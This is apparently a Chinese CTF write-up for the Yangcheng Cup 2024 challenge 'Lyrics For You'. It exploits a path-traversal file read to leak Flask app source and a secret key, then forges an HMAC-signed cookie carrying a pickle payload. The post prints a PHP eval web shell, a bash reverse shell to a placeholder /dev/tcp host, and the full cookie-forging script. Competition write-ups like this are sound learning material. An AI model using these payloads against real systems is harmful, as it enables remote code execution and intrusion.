+++
title = "羊城杯2024"
slug = "yangcheng-cup-2024"
description = "虽然我输出少，但是咱还是得参与啊"
date = "2024-08-27T22:06:07"
lastmod = "2024-08-27T22:06:07"
image = ""
license = ""
categories = ["赛题"]
tags = ["pickle"]
+++

# 0x01 前言

这几天比赛是不断的，虽然我输出少，但是咱还是得参与啊

# 0x02 question

## Lyrics For You

扫描出来有两个路由`/board`和`login`，同时观察`url`,可能存在目录穿越

直接读取`flag`,失败发现可以载入代码在`board`,尝试载入小马

```phtml
<script language='php'>@eval($_POST[1]);</script>
```

同样失败了，那么可能这就不是一个`php`网页了,尝试读取`python`文件成功了

```
查看当前进程
/lyrics?lyrics=/proc/self/cmdline
得到
python3-u/usr/etc/app/app.py
```

```
/lyrics?lyrics=/usr/etc/app/app.py
```

```python
import os
import random
from flask import Flask, make_response, request, render_template, redirect, url_for
from werkzeug.utils import secure_filename
import json
from itsdangerous import URLSafeTimedSerializer, BadSignature

app = Flask(__name__)
app.secret_key = random.randbytes(16)

# Initialize URLSafeTimedSerializer with the secret key
serializer = URLSafeTimedSerializer(app.secret_key)

class UserData:
    def __init__(self, username):
        self.username = username

# 避免不区分大小写
def waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    for word in blacklist:
        if word.lower() in data.lower():
            return True
    return False

@app.route("/", methods=['GET'])
def index():
    return render_template('index.html')

@app.route("/lyrics", methods=['GET'])
def lyrics():
    query = request.args.get("lyrics")
    if waf(query.encode()):
        return "Invalid input detected."

    filename = secure_filename(query)
    path = os.path.join(os.getcwd(), "lyrics", filename)
    # 任意文件读取
    try:
        with open(path, 'r') as f:
            res = f.read()
    except FileNotFoundError:
        return "No lyrics found"
    return make_response(res, 200, {"Content-Type": "text/plain; charset=UTF-8"})

# 保存输入到cookie
@app.route("/login", methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form["username"]
        user = UserData(username)
        user_data = {"username": user.username}
        user_data_serialized = serializer.dumps(user_data)
        response = make_response(redirect(url_for('board')))
        response.set_cookie("user", user_data_serialized)
        return response
    return render_template('login.html')

@app.route("/board", methods=['GET'])
def board():
    cookie = request.cookies.get("user")
    if not cookie:
        return redirect(url_for('login'))

    try:
        data = serializer.loads(cookie)
    except BadSignature:
        return "Nope, invalid code get out!"

    if "username" not in data:
        return render_template('user.html', name="guest")
    
    if data["username"] == "admin":
        return render_template('admin.html', name=data["username"])
    else:
        return render_template('user.html', name=data["username"])

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

很明显是个反序列化了,查看`cookie`生成源码

继续读取`/lyrics?lyrics=/usr/etc/app/cookie.py`

```python
import base64
import hashlib
import hmac
import json
from flask import make_response, request

# 序列化身份为cookie
def cookie_encode(data, key):
    msg = base64.b64encode(json.dumps(data).encode('utf-8'))
    sig = base64.b64encode(hmac.new(key.encode('utf-8'), msg, digestmod=hashlib.md5).digest())
    return '!' + sig.decode('utf-8') + '?' + msg.decode('utf-8')

# 处理传入的cookie
def cookie_decode(data, key):
    if cookie_is_encoded(data):
        sig, msg = data.split('?', 1)
        sig = sig[1:]  # Remove the '!' at the start
        expected_sig = base64.b64encode(hmac.new(key.encode('utf-8'), msg.encode('utf-8'), digestmod=hashlib.md5).digest()).decode('utf-8')
        if _lscmp(sig, expected_sig):
            return json.loads(base64.b64decode(msg).decode('utf-8'))
    return None

def waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    for word in blacklist:
        if word in data.encode('utf-8'):
            valid = True
            break
    return valid
# 验证cookie
def cookie_check(key, secret=None):
    data = request.cookies.get(key)
    if data and cookie_is_encoded(data):
        decoded_data = cookie_decode(data, secret)
        if decoded_data and waf(json.dumps(decoded_data)):
            return True
    return False
# 还是验证
def get_cookie(key, default=None, secret=None):
    value = request.cookies.get(key)
    if secret and value:
        dec = cookie_decode(value, secret)
        return dec if dec else default
    return value or default

def cookie_is_encoded(data):
    return data.startswith('!') and '?' in data

def _lscmp(a, b):
    """Compare two strings in a way that is resistant to timing attacks."""
    return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)

def set_cookie(name, value, secret=None, **options):
    if secret:
        value = cookie_encode({name: value}, secret)
    elif not isinstance(value, str):
        raise TypeError('Secret key missing for non-string Cookie.')
    if len(value) > 4096:
        raise ValueError('Cookie value too long.')
    
    resp = make_response("success")
    resp.set_cookie(name, value, max_age=options.get('max_age', 3600))
    return resp

```

```
/lyrics?lyrics=/usr/etc/app/config/secret_key.py
得到
secret_code = "EnjoyThePlayTime123456"
```

在`login`输入`admin`

然后弹`shell`

```python
import base64
import hashlib
import hmac

def tob(s, enc='utf8'):
    return s.encode(enc) if isinstance(s, unicode) else bytes(s)


unicode = str
basestring = str
secret_code = "EnjoyThePlayTime123456"
a = b'''(cos
system
S'bash -c "bash -i >& /dev/tcp/IP/9999 0>&1"'
o.
'''
sig = base64.b64encode(hmac.new(tob(secret_code), base64.b64encode(a), digestmod=hashlib.md5).digest())
payload = tob('!') + sig + tob('?') + base64.b64encode(a)
print(payload.decode())

# 反向构造出cookie值
```

把`cookie`换了就`getshell`了

后面就直接`./readflag`

# 0x03 小结

`python`反序列化，从学到现在就没用过，但是今天试了一下，中途读取文件的时候还是尝试要比较多一些
